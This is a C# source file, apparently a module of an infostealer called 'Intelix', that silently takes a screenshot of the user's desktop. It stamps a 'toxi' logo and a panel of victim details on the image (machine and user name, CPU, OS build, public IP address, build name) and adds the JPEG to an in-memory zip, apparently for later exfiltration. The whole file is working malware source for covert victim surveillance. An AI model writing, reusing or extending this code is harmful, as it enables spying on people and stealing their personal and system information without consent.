using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Drawing.Text;
using System.IO;
using System.Windows.Forms;
using Intelix.Helper;
using Intelix.Helper.Data;

namespace Intelix.Targets.Device;

public class ScreenShot : ITarget
{
	public void Collect(InMemoryZip zip, Counter counter)
	{
		Rectangle bounds = Screen.PrimaryScreen.Bounds;
		using Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format24bppRgb);
		using Graphics graphics = Graphics.FromImage(bitmap);
		IntPtr hdc = graphics.GetHdc();
		IntPtr windowDC = NativeMethods.GetWindowDC(NativeMethods.GetDesktopWindow());
		NativeMethods.BitBlt(hdc, 0, 0, bounds.Width, bounds.Height, windowDC, 0, 0, 13369376);
		graphics.ReleaseHdc(hdc);
		NativeMethods.ReleaseDC(NativeMethods.GetDesktopWindow(), windowDC);
		graphics.SmoothingMode = SmoothingMode.AntiAlias;
		graphics.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
		graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
		RectangleF rectangleF = new RectangleF(0f, 0f, bounds.Width, bounds.Height);
		StringFormat format = new StringFormat
		{
			Alignment = StringAlignment.Center,
			LineAlignment = StringAlignment.Center
		};
		float num = Math.Max(24f, (float)bounds.Width / 12f);
		using (Font font = new Font("Segoe UI Black", num, FontStyle.Bold, GraphicsUnit.Pixel))
		{
			using GraphicsPath graphicsPath = new GraphicsPath();
			graphicsPath.AddString("toxi", font.FontFamily, (int)font.Style, font.Size, rectangleF, format);
			int num2 = 10;
			for (int num3 = num2; num3 >= 1; num3--)
			{
				int alpha = (int)(30.0 * (1.0 - (double)num3 / (double)num2)) + 8;
				using Pen pen = new Pen(width: num / 18f * (float)num3, color: Color.FromArgb(alpha, 120, 40, 200));
				pen.LineJoin = LineJoin.Round;
				graphics.DrawPath(pen, graphicsPath);
			}
			using (LinearGradientBrush linearGradientBrush = new LinearGradientBrush(rectangleF, Color.FromArgb(255, 85, 0, 255), Color.FromArgb(255, 0, 220, 255), LinearGradientMode.Horizontal))
			{
				ColorBlend colorBlend = new ColorBlend();
				colorBlend.Colors = new Color[4]
				{
					Color.FromArgb(255, 48, 0, 96),
					Color.FromArgb(255, 102, 0, 204),
					Color.FromArgb(255, 0, 150, 255),
					Color.FromArgb(255, 0, 255, 180)
				};
				colorBlend.Positions = new float[4] { 0f, 0.45f, 0.75f, 1f };
				linearGradientBrush.InterpolationColors = colorBlend;
				using PathGradientBrush pathGradientBrush = new PathGradientBrush(graphicsPath);
				pathGradientBrush.CenterColor = Color.FromArgb(220, 255, 255, 255);
				pathGradientBrush.SurroundColors = new Color[1] { Color.FromArgb(0, 0, 0, 0) };
				pathGradientBrush.CenterPoint = new PointF(rectangleF.Width * 0.5f, rectangleF.Height * 0.45f);
				graphics.FillPath(linearGradientBrush, graphicsPath);
				graphics.FillPath(pathGradientBrush, graphicsPath);
			}
			using (Pen pen2 = new Pen(Color.FromArgb(220, 255, 255, 255), Math.Max(2f, num / 28f)))
			{
				pen2.LineJoin = LineJoin.Round;
				graphics.DrawPath(pen2, graphicsPath);
			}
			PointF[] array = new PointF[5]
			{
				new PointF(rectangleF.Width * 0.22f, rectangleF.Height * 0.38f),
				new PointF(rectangleF.Width * 0.33f, rectangleF.Height * 0.52f),
				new PointF(rectangleF.Width * 0.68f, rectangleF.Height * 0.4f),
				new PointF(rectangleF.Width * 0.6f, rectangleF.Height * 0.6f),
				new PointF(rectangleF.Width * 0.5f, rectangleF.Height * 0.3f)
			};
			for (int i = 0; i < array.Length; i++)
			{
				PointF pointF = array[i];
				float num4 = Math.Max(2f, num / 28f);
				using (SolidBrush brush = new SolidBrush(Color.FromArgb(230, 255, 250, 200)))
				{
					graphics.FillEllipse(brush, pointF.X - num4 / 2f, pointF.Y - num4 / 2f, num4, num4);
				}
				using SolidBrush brush2 = new SolidBrush(Color.FromArgb(80, 150, 220, 255));
				graphics.FillEllipse(brush2, pointF.X - num4 * 2f, pointF.Y - num4 * 2f, num4 * 4f, num4 * 4f);
			}
		}
		string fileName = Process.GetCurrentProcess().MainModule.FileName;
		string[] array2 = new string[12]
		{
			"Machine: " + Environment.MachineName,
			"User: " + Environment.UserName,
			$"Time: {DateTimeOffset.Now:yyyy-MM-dd HH:mm:ss zzz}",
			$".NET: {Environment.Version}",
			"CPU: " + CpuInfo.GetName(),
			$"CPU Cores: {CpuInfo.GetLogicalCores()}",
			"OS Product: " + WindowsInfo.GetProductName(),
			"OS Build: " + WindowsInfo.GetBuildNumber(),
			"OS Arch: " + WindowsInfo.GetArchitecture(),
			"Public ip: " + IpApi.GetPublicIp(),
			"Build Name: " + Path.GetFileName(Path.GetDirectoryName(fileName)) + "\\" + Path.GetFileName(fileName),
			"Code by @tcixt"
		};
		float num5 = Math.Max(12f, (float)bounds.Width / 120f);
		using (Font font2 = new Font("Segoe UI", num5, FontStyle.Regular, GraphicsUnit.Pixel))
		{
			float num6 = Math.Max(8f, num5 * 0.6f);
			float num7 = 0f;
			float num8 = 0f;
			string[] array3 = array2;
			foreach (string text in array3)
			{
				SizeF sizeF = graphics.MeasureString(text, font2);
				if (sizeF.Width > num7)
				{
					num7 = sizeF.Width;
				}
				if (sizeF.Height > num8)
				{
					num8 = sizeF.Height;
				}
			}
			float width = num7 + num6 * 2f;
			float num9 = (float)array2.Length * num8 + num6 * 2f;
			RectangleF rect = new RectangleF(12f, (float)bounds.Height - num9 - 12f, width, num9);
			using (SolidBrush brush3 = new SolidBrush(Color.FromArgb(180, 6, 6, 10)))
			{
				using Pen pen3 = new Pen(Color.FromArgb(220, 60, 60, 80), 1f);
				graphics.FillRectangle(brush3, rect);
				graphics.DrawRectangle(pen3, rect.X, rect.Y, rect.Width, rect.Height);
			}
			float num10 = rect.X + num6;
			float num11 = rect.Y + num6;
			using SolidBrush brush4 = new SolidBrush(Color.FromArgb(160, 0, 0, 0));
			using SolidBrush brush5 = new SolidBrush(Color.FromArgb(240, 245, 250, 255));
			array3 = array2;
			foreach (string s in array3)
			{
				graphics.DrawString(s, font2, brush4, new PointF(num10 + 1f, num11 + 1f));
				graphics.DrawString(s, font2, brush5, new PointF(num10, num11));
				num11 += num8;
			}
		}
		using MemoryStream memoryStream = new MemoryStream();
		ImageCodecInfo imageCodecInfo = null;
		ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
		for (int j = 0; j < imageEncoders.Length; j++)
		{
			if (string.Equals(imageEncoders[j].MimeType, "image/jpeg", StringComparison.OrdinalIgnoreCase))
			{
				imageCodecInfo = imageEncoders[j];
				break;
			}
		}
		if (imageCodecInfo != null)
		{
			Encoder quality = Encoder.Quality;
			EncoderParameters encoderParameters = new EncoderParameters(1);
			encoderParameters.Param[0] = new EncoderParameter(quality, 90L);
			bitmap.Save(memoryStream, imageCodecInfo, encoderParameters);
		}
		else
		{
			bitmap.Save(memoryStream, ImageFormat.Jpeg);
		}
		byte[] array4 = memoryStream.ToArray();
		if (array4 != null && array4.Length != 0)
		{
			string entryPath = "screenshot.jpg";
			zip.AddFile(entryPath, array4);
		}
	}
}
